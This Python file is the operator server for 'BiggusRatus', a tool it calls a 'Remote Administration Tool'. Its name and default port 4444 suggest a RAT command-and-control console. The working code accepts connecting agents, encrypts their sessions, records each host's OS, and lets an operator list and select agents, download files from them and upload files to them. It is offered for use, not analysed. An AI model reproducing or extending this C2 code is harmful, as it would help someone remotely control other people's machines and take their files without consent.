import argparse
import json
import logging
import queue
import socket
import sys
import threading
import time
import uuid
from datetime import datetime
from typing import Any, Dict, Optional, Tuple

from common.constants import (
    DEFAULT_HOST,
    DEFAULT_PORT,
    DOWNLOAD_ACTION,
    HANDSHAKE_ACTION,
    PROTOCOL_VERSION,
    READ_TIMEOUT_SEC,
    SOCKET_TIMEOUT_SEC,
    TEST_ACTION,
    UPLOAD_ACTION,
)
from common.protocol import (
    build_command,
    build_handshake_response,
    build_success_response,
    decode_message,
    encode_message,
    extract_os_info_from_handshake,
)
from common.tcp import ProtocolError, recv_frame, send_frame
from common.crypto import Encryptor, CryptoError

logger = logging.getLogger(__name__)

# Global reference to current server instance for prompt restoration
_current_server: Optional["Server"] = None


class PromptRestoringHandler(logging.Handler):
    # Custom handler that restores the prompt after emitting log records.

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = self.format(record)
            # Print the log message
            if record.levelno >= logging.ERROR:
                print(f"\r{msg}", file=sys.stderr)
            else:
                print(f"\r{msg}")
            # Restore prompt if server is active
            if _current_server is not None and _current_server.running:
                prompt = _current_server._get_prompt()
                print(prompt, end="", flush=True)
        except Exception:
            self.handleError(record)


class OutputFormatter:
    # Handles formatted output for the server CLI.

    @staticmethod
    def timestamp() -> str:
        # Return current timestamp string.
        return datetime.now().strftime("%H:%M:%S")

    @staticmethod
    def info(message: str) -> None:
        # Print an info message with timestamp.
        print(f"[{OutputFormatter.timestamp()}] {message}")

    @staticmethod
    def error(message: str) -> None:
        # Print an error message with timestamp.
        print(f"[{OutputFormatter.timestamp()}] [!] {message}", file=sys.stderr)

    @staticmethod
    def success(message: str) -> None:
        # Print a success message with timestamp.
        print(f"[{OutputFormatter.timestamp()}] [+] {message}")

    @staticmethod
    def warning(message: str) -> None:
        # Print a warning message with timestamp.
        print(f"[{OutputFormatter.timestamp()}] [?] {message}")

    @staticmethod
    def format_duration(seconds: float) -> str:
        # Format duration in human-readable format.
        if seconds < 60:
            return f"{seconds:.0f}s"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.1f}m"
        else:
            hours = seconds / 3600
            return f"{hours:.1f}h"

    @staticmethod
    def format_session_table(sessions: list, selected_id: Optional[str] = None) -> str:
        # Format sessions as a table.
        if not sessions:
            return "No connected agents."

        header = f"{'ID':<36} {'Address':<21} {'OS':<8} {'Duration':<10} {'Idle':<10} {'Status':<8}"
        lines = [header, "-" * len(header)]

        for session in sessions:
            session_id = session.agent_id[:8] + "..."
            address = f"{session.address[0]}:{session.address[1]}"
            os_type = (session.os_type or "unknown")[:7]
            duration = OutputFormatter.format_duration(session.session_duration)
            idle = OutputFormatter.format_duration(session.idle_time)
            status = "active" if session.idle_time < 30 else "idle"

            marker = "*" if session.agent_id == selected_id else " "
            line = f"{marker}{session_id:<35} {address:<21} {os_type:<8} {duration:<10} {idle:<10} {status:<8}"
            lines.append(line)

        return "\n".join(lines)


class AgentSession:
    # Represents a connected agent session.

    def __init__(self, agent_id: str, address: Tuple[str, int]) -> None:
        self.agent_id = agent_id
        self.address = address
        self.socket: Optional[socket.socket] = None
        self.connected_at = time.time()
        self.last_seen = time.time()
        self.reconnect_count = 0
        self.encryptor: Optional[Encryptor] = None
        self.os_type: Optional[str] = None
        self.os_info: Optional[Dict[str, Any]] = None

    def update_last_seen(self) -> None:
        # Update the last seen timestamp.
        self.last_seen = time.time()

    def set_os_info(self, os_info: Dict[str, Any]) -> None:
        # Set the OS information for this agent.
        self.os_info = os_info
        self.os_type = os_info.get("os_type", "unknown")

    @property
    def session_duration(self) -> float:
        # Return session duration in seconds.
        return time.time() - self.connected_at

    @property
    def idle_time(self) -> float:
        # Return idle time in seconds since last activity.
        return time.time() - self.last_seen

    def encrypt_data(self, data: bytes) -> bytes:
        # Encrypt data if encryption is available.
        if self.encryptor is not None:
            return self.encryptor.encrypt(data)
        return data

    def decrypt_data(self, data: bytes) -> bytes:
        # Decrypt data if encryption is available.
        if self.encryptor is not None:
            return self.encryptor.decrypt(data)
        return data


class Server:
    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.running = False
        self.sessions: Dict[str, AgentSession] = {}
        self.lock = threading.Lock()
        self._accept_thread: Optional[threading.Thread] = None
        self.selected_agent_id: Optional[str] = None
        self._response_waiters: Dict[str, "queue.Queue[Dict[str, Any]]"] = {}
        self._response_lock = threading.Lock()

    def start(self) -> None:
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_sock.bind((self.host, self.port))
        listen_sock.listen()
        self.socket = listen_sock
        self.running = True
        self._accept_thread = threading.Thread(
            target=self._accept_connections, name="server-accept", daemon=True
        )
        self._accept_thread.start()
        bound = listen_sock.getsockname()
        logger.info(f"Server started on {bound[0]}:{bound[1]}")

    def _accept_connections(self) -> None:
        assert self.socket is not None
        while self.running:
            try:
                client_socket, address = self.socket.accept()
                agent_id = str(uuid.uuid4())
                logger.info(
                    f"New TCP connection from {address[0]}:{address[1]} "
                    f"(agent_id={agent_id})"
                )
                client_socket.settimeout(SOCKET_TIMEOUT_SEC)
                session = AgentSession(agent_id, address)
                session.socket = client_socket
                with self.lock:
                    self.sessions[agent_id] = session
                thread = threading.Thread(
                    target=self._handle_agent,
                    args=(client_socket, address, agent_id),
                    name=f"agent-{agent_id[:8]}",
                    daemon=True,
                )
                thread.start()
            except OSError:
                break

    def _handle_agent(
        self,
        client_socket: socket.socket,
        address: Tuple[str, int],
        agent_id: str,
    ) -> None:
        try:
            encryptor, os_info = self._perform_handshake(client_socket)
            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.encryptor = encryptor
                    if os_info:
                        session.set_os_info(os_info)
                    session.update_last_seen()
            os_type = os_info.get("os_type", "unknown") if os_info else "unknown"
            logger.info(
                f"Handshake complete for agent {agent_id} "
                f"({address[0]}:{address[1]}) - OS: {os_type}"
            )
            self._agent_message_loop(client_socket, agent_id)
        except socket.timeout as exc:
            logger.warning(
                f"Agent {agent_id} ({address[0]}:{address[1]}) timed out: {exc}"
            )
        except (
            ConnectionError,
            OSError,
            ProtocolError,
            ValueError,
            json.JSONDecodeError,
            CryptoError,
        ) as exc:
            logger.warning(
                f"Agent {agent_id} ({address[0]}:{address[1]}) disconnected: {exc}"
            )
        except Exception:
            logger.exception(
                f"Unexpected error handling agent {agent_id} "
                f"({address[0]}:{address[1]})"
            )
        finally:
            try:
                client_socket.close()
            except OSError:
                pass
            with self.lock:
                self.sessions.pop(agent_id, None)
                if self.selected_agent_id == agent_id:
                    self.selected_agent_id = None
            logger.info(f"Agent session closed: {agent_id}")

    def _perform_handshake(
        self, client_socket: socket.socket
    ) -> Tuple[Encryptor, Optional[Dict[str, Any]]]:
        raw = recv_frame(client_socket)
        message = decode_message(raw)
        self._validate_handshake_request(message)
        request_id = str(message.get("id", ""))
        # Extract OS info from handshake
        os_info = extract_os_info_from_handshake(message)
        # Create encryptor and send key in handshake response
        encryptor = Encryptor()
        response = build_handshake_response(request_id, encryptor=encryptor)
        send_frame(client_socket, encode_message(response))
        return encryptor, os_info

    @staticmethod
    def _validate_handshake_request(message: Dict[str, Any]) -> None:
        if message.get("version") != PROTOCOL_VERSION:
            raise ValueError("Invalid or unsupported protocol version")
        if message.get("type") != "command":
            raise ValueError("Handshake must be a command message")
        if message.get("action") != HANDSHAKE_ACTION:
            raise ValueError("First message must be handshake command")

    def _handle_agent_incoming(
        self, client_socket: socket.socket, agent_id: str, message: Dict[str, Any]
    ) -> None:
        with self.lock:
            session = self.sessions.get(agent_id)
            encryptor = session.encryptor if session else None
        if message.get("type") == "response":
            rid = str(message.get("id", ""))
            with self._response_lock:
                waiter = self._response_waiters.pop(rid, None)
            if waiter is not None:
                waiter.put(message)
                return
            logger.info(f"Received response from agent {agent_id}: {message}")
            return
        if message.get("type") == "command" and message.get("action") == TEST_ACTION:
            logger.info(f"Received command from agent {agent_id}: {message}")
            req_id = str(message.get("id", ""))
            reply = build_success_response(
                req_id, TEST_ACTION, payload='{"ok":true}', message="test-ok"
            )
            # Encrypt and send
            plaintext = encode_message(reply)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(client_socket, ciphertext)
            return
        logger.warning(f"Unhandled message from agent {agent_id}: {message}")

    def _agent_message_loop(self, client_socket: socket.socket, agent_id: str) -> None:
        while self.running:
            try:
                ciphertext = recv_frame(client_socket)
                # Decrypt message
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session and session.encryptor:
                        plaintext = session.decrypt_data(ciphertext)
                    else:
                        plaintext = ciphertext
                message = decode_message(plaintext)
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session:
                        session.update_last_seen()
                self._handle_agent_incoming(client_socket, agent_id, message)
            except socket.timeout:
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session and session.idle_time > READ_TIMEOUT_SEC:
                        logger.warning(
                            f"Agent {agent_id} idle timeout ({session.idle_time:.1f}s)"
                        )
                        raise
                continue
            except CryptoError as exc:
                logger.error(f"Agent {agent_id} decryption error: {exc}")
                raise

    def send_test_to_agent(self, agent_id: str) -> None:
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return
        cmd = build_command(TEST_ACTION, {})
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            # Encrypt and send
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)
            response = waiter.get(timeout=30.0)
            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()
            logger.info(f"Test round-trip OK from {agent_id}: {response}")
        except queue.Empty:
            logger.error(f"Timed out waiting for test response from {agent_id}")
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def download_from_agent(
        self, agent_id: str, remote_path: str, local_path: str
    ) -> bool:
        # Download a file from an agent and save it locally.
        import base64

        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return False

        cmd = build_command(DOWNLOAD_ACTION, {"remote_path": remote_path})
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            # Encrypt and send
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)

            # Wait for response with extended timeout for large files
            response = waiter.get(timeout=120.0)

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()

            # Parse response
            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                result = json.loads(payload)
            except json.JSONDecodeError:
                logger.error("Invalid response payload")
                return False

            if not result.get("success", False):
                logger.error(f"Download failed: {result.get('error', 'Unknown error')}")
                return False

            # Decode and save file
            content_base64 = result.get("content", "")
            if not content_base64:
                logger.error("No file content in response")
                return False

            file_content = base64.b64decode(content_base64)
            file_size = len(file_content)

            # Create directory if needed
            import os
            os.makedirs(os.path.dirname(local_path) or ".", exist_ok=True)

            with open(local_path, "wb") as f:
                f.write(file_content)

            logger.info(
                f"Downloaded {remote_path} -> {local_path} ({file_size} bytes) "
                f"from {agent_id}"
            )
            return True

        except queue.Empty:
            logger.error(f"Timed out waiting for download response from {agent_id}")
            return False
        except Exception as e:
            logger.error(f"Download error: {e}")
            return False
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def upload_to_agent(
        self, agent_id: str, local_path: str, remote_path: str
    ) -> bool:
        # Upload a file from local system to an agent.
        import base64
        import os

        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return False

        # Check if local file exists
        if not os.path.exists(local_path):
            logger.error(f"Local file not found: {local_path}")
            return False

        if not os.path.isfile(local_path):
            logger.error(f"Not a file: {local_path}")
            return False

        try:
            # Read and encode the file
            with open(local_path, "rb") as f:
                file_content = f.read()
            file_size = len(file_content)
            content_base64 = base64.b64encode(file_content).decode("utf-8")

            logger.info(f"Uploading {local_path} ({file_size} bytes) to agent {agent_id}")

            # Build and send upload command
            cmd = build_command(UPLOAD_ACTION, {
                "remote_path": remote_path,
                "content": content_base64
            })
            request_id = str(cmd["id"])
            waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
            with self._response_lock:
                self._response_waiters[request_id] = waiter

            # Encrypt and send
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)

            # Wait for response with extended timeout for large files
            response = waiter.get(timeout=120.0)

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()

            # Parse response
            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                result = json.loads(payload)
            except json.JSONDecodeError:
                logger.error("Invalid response payload")
                return False

            if not result.get("success", False):
                logger.error(f"Upload failed: {result.get('error', 'Unknown error')}")
                return False

            logger.info(
                f"Uploaded {local_path} -> {remote_path} ({file_size} bytes) "
                f"to {agent_id}"
            )
            return True

        except queue.Empty:
            logger.error(f"Timed out waiting for upload response from {agent_id}")
            return False
        except Exception as e:
            logger.error(f"Upload error: {e}")
            return False
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    @staticmethod
    def _print_help() -> None:
        # Display available server commands.
        print("\nAvailable commands:")
        print("  help                           Display available commands")
        print("  list                           Show all connected agents")
        print("  select <agent_id>              Select agent for interaction")
        print("  test                           Send test command to selected agent")
        print("  download <remote> <local>      Download file from agent")
        print("  upload <local> <remote>        Upload file to agent")
        print("  exit                           Disconnect selected agent")
        print("  quit                           Shutdown server")
        print()

    def _get_prompt(self) -> str:
        # Generate the command prompt with context.
        with self.lock:
            session_count = len(self.sessions)
            selected = self.selected_agent_id
        if selected:
            short_id = selected[:8]
            return f"biggusRatus[{short_id}]> "
        return f"biggusRatus[{session_count}]> "

    def run_interactive(self) -> None:
        OutputFormatter.info("Server ready. Type 'help' for commands.")
        while self.running:
            try:
                prompt = self._get_prompt()
                line = input(prompt).strip()
            except EOFError:
                break
            if not line:
                continue
            parts = line.split(maxsplit=1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            if cmd == "help":
                self._print_help()
            elif cmd == "list":
                with self.lock:
                    sessions = list(self.sessions.values())
                    selected = self.selected_agent_id
                print(OutputFormatter.format_session_table(sessions, selected))
            elif cmd == "select":
                if not arg:
                    OutputFormatter.error("Usage: select <agent_id>")
                    continue
                with self.lock:
                    if arg not in self.sessions:
                        OutputFormatter.error(f"Unknown agent: {arg}")
                        continue
                    self.selected_agent_id = arg
                OutputFormatter.success(f"Selected agent {arg[:8]}...")
            elif cmd == "test":
                target = self.selected_agent_id
                if target is None:
                    OutputFormatter.error("Select an agent first: select <agent_id>")
                    continue
                self.send_test_to_agent(target)
            elif cmd == "download":
                target = self.selected_agent_id
                if target is None:
                    OutputFormatter.error("Select an agent first: select <agent_id>")
                    continue
                # Parse arguments: download <remote_path> <local_path>
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    OutputFormatter.error("Usage: download <remote_path> <local_path>")
                    continue
                remote_path, local_path = args[0], args[1]
                OutputFormatter.info(f"Downloading {remote_path} -> {local_path}...")
                success = self.download_from_agent(target, remote_path, local_path)
                if success:
                    OutputFormatter.success(f"Downloaded {remote_path} -> {local_path}")
                else:
                    OutputFormatter.error(f"Failed to download {remote_path}")
            elif cmd == "upload":
                target = self.selected_agent_id
                if target is None:
                    OutputFormatter.error("Select an agent first: select <agent_id>")
                    continue
                # Parse arguments: upload <local_path> <remote_path>
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    OutputFormatter.error("Usage: upload <local_path> <remote_path>")
                    continue
                local_path, remote_path = args[0], args[1]
                OutputFormatter.info(f"Uploading {local_path} -> {remote_path}...")
                success = self.upload_to_agent(target, local_path, remote_path)
                if success:
                    OutputFormatter.success(f"Uploaded {local_path} -> {remote_path}")
                else:
                    OutputFormatter.error(f"Failed to upload {local_path}")
            elif cmd == "exit":
                if self.selected_agent_id is None:
                    OutputFormatter.warning("No agent selected.")
                    continue
                with self.lock:
                    session = self.sessions.pop(self.selected_agent_id, None)
                    sock = session.socket if session else None
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass
                OutputFormatter.info(f"Disconnected agent {self.selected_agent_id[:8]}...")
                self.selected_agent_id = None
            elif cmd == "quit":
                OutputFormatter.info("Shutting down server...")
                break
            else:
                OutputFormatter.error(f"Unknown command: {cmd}")
                print("Type 'help' for available commands.")

    def stop(self) -> None:
        self.running = False
        with self.lock:
            for session in list(self.sessions.values()):
                if session.socket:
                    try:
                        session.socket.close()
                    except OSError:
                        pass
            self.sessions.clear()
            self.selected_agent_id = None
        if self.socket:
            try:
                self.socket.close()
            except OSError:
                pass
            self.socket = None
        if self._accept_thread is not None:
            self._accept_thread.join(timeout=2.0)
            self._accept_thread = None
        logger.info("Server stopped")


def parse_args() -> argparse.Namespace:
    # Parse command-line arguments.
    parser = argparse.ArgumentParser(
        description="BiggusRatus Server - Remote Administration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python -m server.server                    # Start server on default port 4444
  python -m server.server --port 8443        # Start server on port 8443
  python -m server.server --host 0.0.0.0     # Listen on all interfaces
  python -m server.server --verbose          # Enable debug logging
        """,
    )
    parser.add_argument(
        "--host",
        type=str,
        default=DEFAULT_HOST,
        help=f"Host address to bind to (default: {DEFAULT_HOST})",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"Port to listen on (default: {DEFAULT_PORT})",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose (debug) logging",
    )
    return parser.parse_args()


def main() -> None:
    global _current_server
    args = parse_args()
    log_level = logging.DEBUG if args.verbose else logging.INFO

    # Configure logging with prompt-restoring handler
    root_logger = logging.getLogger()
    root_logger.setLevel(log_level)

    # Remove any existing handlers
    for handler in root_logger.handlers[:]:
        root_logger.removeHandler(handler)

    # Add our custom handler
    handler = PromptRestoringHandler()
    handler.setFormatter(logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    ))
    root_logger.addHandler(handler)

    server = Server(host=args.host, port=args.port)
    _current_server = server
    try:
        server.start()
        server.run_interactive()
    except KeyboardInterrupt:
        OutputFormatter.info("Interrupt received")
    finally:
        _current_server = None
        server.stop()


if __name__ == "__main__":
    main()
